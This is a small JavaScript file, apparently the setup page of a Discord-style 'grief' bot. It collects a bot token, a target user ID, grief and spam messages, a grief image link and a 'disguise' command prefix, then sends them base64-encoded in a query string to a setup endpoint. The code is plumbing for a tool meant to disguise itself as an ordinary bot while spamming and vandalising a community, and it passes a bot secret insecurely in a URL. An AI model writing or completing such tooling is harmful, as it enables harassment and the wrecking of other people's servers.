window.onload = function () {

    document.getElementById("submitBtn").addEventListener("click", () => {
        let botToken = document.getElementById("botToken").value;
        let userID = document.getElementById("userID").value;
        let activityDescription = document.getElementById("activityDescription").value;
        let griefMessage = document.getElementById("griefMessage").value;
        let spamMessage = document.getElementById("spamMessage").value;
        let disguiseCommandPrefix = "!";
        let griefPicture = "https://0cn.de/po21"

        if (botToken != "" && userID != "") {
            activityDescription = (activityDescription == "") ? document.getElementById("activityDescription").placeholder : activityDescription;
            griefMessage = (griefMessage == "") ? document.getElementById("griefMessage").placeholder : griefMessage;
            spamMessage = (spamMessage == "") ? document.getElementById("spamMessage").placeholder : spamMessage;

            const jsonObj = { botToken: botToken, userID: userID, griefMessage: griefMessage, spamMessage: spamMessage, griefPicture: griefPicture, activityDescription: activityDescription, disguiseCommandPrefix: disguiseCommandPrefix };
            sendRequest("setup?value=" + btoa(JSON.stringify(jsonObj)), callback);
        }
    });

}

function callback() {
    location.reload();
}